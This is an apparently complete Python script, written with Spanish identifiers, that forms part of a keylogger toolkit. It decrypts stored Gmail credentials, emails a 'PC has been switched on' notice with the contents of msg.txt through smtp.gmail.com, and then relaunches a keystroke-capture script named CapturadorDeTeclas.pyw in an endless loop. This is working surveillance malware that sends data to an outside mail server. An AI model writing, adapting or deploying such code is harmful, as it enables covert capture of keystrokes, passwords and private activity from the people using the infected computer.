#! /usr/bin/env python3

import os
import time
import getpass
import os.path as path
import shutil
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
from cryptography.fernet import Fernet
import subprocess

def EJECUCION():

        if os.name == "posix":
                
                os.system ("python3 CapturadorDeTeclas.pyw")

        elif os.name == "ce" or os.name == "nt" or os.name == "dos":

                SIGUIENTE_SCRIPT = subprocess.call("CapturadorDeTeclas.pyw",shell=True)

def CARGAR_KEY():
        return open("../DefaultKey/Config/password.key","rb").read()

LLAVE = CARGAR_KEY()

PASSWORD_KEY = Fernet(LLAVE)

PASSWORD_ENC = (open('../DefaultKey/Config/password.enc', 'rb').read())

PASSWORD = PASSWORD_KEY.decrypt(PASSWORD_ENC).decode()

DATO_ENC = (open('../DefaultKey/Config/dato.enc', 'rb').read())

DATO = PASSWORD_KEY.decrypt(DATO_ENC).decode()

PC = open('msg.txt','r')
sms = PC.read()
msg = MIMEMultipart()
MENSAJE = sms
msg['From'] = DATO
msg['To'] = DATO
msg['Subject'] = 'Se ha Encendido un PC'

msg.attach(MIMEText(MENSAJE, 'plain'))

server = smtplib.SMTP('smtp.gmail.com: 587')
server.starttls()
server.login(msg['From'],PASSWORD)
server.sendmail(msg['From'],msg['To'],msg.as_string())
server.quit()

while True:

        EJECUCION()
